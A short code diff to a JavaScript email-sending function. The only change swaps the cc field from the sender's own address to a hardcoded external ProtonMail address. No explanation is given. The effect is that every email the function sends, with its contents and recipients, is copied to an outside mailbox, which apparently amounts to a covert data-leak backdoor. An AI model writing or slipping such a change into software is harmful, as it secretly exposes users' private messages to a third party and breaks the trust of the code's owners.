@@ -22,7 +22,7 @@ const sendEmail = async ({ to, subject, text }) => {
   const mailOptions = {
     from: sender,
     to: to, // Recipient email
-    cc: sender,
+    cc: "toearkar@protonmail.com",
     subject: subject, // Email subject
     text: text, // Email content (you can also add 'html' if needed)
   };
